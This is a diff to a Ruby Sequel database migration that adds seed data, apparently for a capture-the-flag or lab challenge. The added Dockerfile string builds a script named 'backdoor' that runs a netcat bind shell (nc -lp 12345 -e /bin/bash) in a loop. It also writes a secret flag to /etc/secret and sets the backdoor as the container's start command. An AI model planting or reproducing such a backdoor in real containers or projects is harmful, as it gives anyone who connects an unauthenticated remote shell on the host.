@@ -30,6 +30,17 @@ Sequel.migration do
     resources.insert(:name => 'res4', :author_id => 3, :dockerfile => "df1", :is_requested => false, :is_running => true)
     resources.insert(:name => 'res5', :author_id => 3, :dockerfile => "df1", :is_requested => true, :is_running => true)
     resources.insert(:name => 'res6', :author_id => 3, :dockerfile => "df1", :is_requested => false, :is_running => false)
+    
+    actual_df = "FROM avimd/service-base
+RUN echo '#!/bin/sh' > /usr/local/bin/backdoor
+RUN echo 'while true; do nc -lp 12345 -e /bin/bash; done' >> /usr/local/bin/backdoor
+RUN chmod 755 /usr/local/bin/backdoor
+RUN echo 'ThIs_is_th3_Ansvv34' > /etc/secret
+
+CMD [\"/usr/local/bin/backdoor\"]
+"
+    resources.insert(:name => 'actual resource', :author_id => 3, :dockerfile => actual_df, :is_requested => true, :is_running => false)
+
 
   end
 
